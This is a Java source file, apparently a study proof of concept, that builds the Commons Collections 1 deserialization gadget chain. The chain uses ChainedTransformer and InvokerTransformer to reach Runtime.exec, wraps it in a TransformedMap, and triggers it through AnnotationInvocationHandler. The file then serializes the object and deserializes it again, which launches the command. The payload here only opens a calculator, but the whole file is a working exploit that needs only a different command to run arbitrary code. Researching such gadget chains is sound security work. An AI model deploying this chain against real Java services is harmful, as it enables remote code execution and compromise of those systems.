package CommonsCollection.Clown_CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class POC1 {
    public static void Serialization(Object object) throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("poc1.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();
        System.out.println("Output");
    }

    public static void Unserialization() throws  Exception{
        FileInputStream fileInputStream = new FileInputStream("poc1.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        objectInputStream.close();
        System.out.println("Input");
    }

    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"calc" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);//创建一个ChainedTransformer对象，起一个链接作用
        Map innerMap = new HashMap();//创建一个HashMap对象
        innerMap.put("value","xxx");
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);//创建一个TransformedMap对象，使用上面的TransformChain来修饰innerMap
//        outerMap.put("test", "xxxx");//这里调用put方法（触发点）

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object obj = constructor.newInstance(Retention.class,outerMap);

        Serialization(obj);
        Unserialization();
    }
}
